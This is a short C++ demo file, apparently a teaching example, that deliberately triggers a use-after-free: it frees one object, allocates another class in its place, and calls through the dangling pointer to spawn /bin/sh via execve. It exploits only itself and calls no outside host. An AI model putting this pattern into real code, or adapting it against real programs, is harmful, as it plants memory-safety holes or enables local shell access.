#include <iostream>
#include <unistd.h> //provides access to POSIX system APIs

/** Very Simple Use After Free Exploit Demo Code 
 * that spawns a shell 
 * To compile using G++: g++ <filename>.cpp -o <outputname> 
 * To run: ./<outputname>
 **/

using namespace std;



class myGoodClass
{
   char* goodString = "good string"; //12 char string (including null terminator) char[0] = 'g', char[1] = 'o', char[11] = '\0' 
   public:
      virtual void func(){
       cout << goodString << endl;
      }
};

class myEvilClass
{

char *shell[2];
   public:
      virtual void func(){   
      shell[0] = "/bin/sh";
      shell[1] = NULL;
      execve(shell[0], shell, NULL);
      }
};


int main( ){
 
 cout << "\n \n " << endl;
 cout << "[]-----Creating myGoodClass" << endl;
 myGoodClass *test = new myGoodClass();
 cout << "[]-----Calling myGoodClass.func()" <<  endl;
 test->func();


 cout << hex << "[]-----Memory location of myGoodClass " << test << endl; 
 delete(test); 
 cout << "[]-----Deleted myGoodClass \n\n" << endl;

 cout << "[]-----Creating myEvilClass" << endl;
 myEvilClass *evil = new myEvilClass();
 cout << hex << "[]-----Memory location of myEvilClass " << test << "\n" << endl; 
 
 cout << "[]-----Calling myGoodClass.func() !!!" << endl;
 test->func(); 
 cout << "\n \n" << endl;
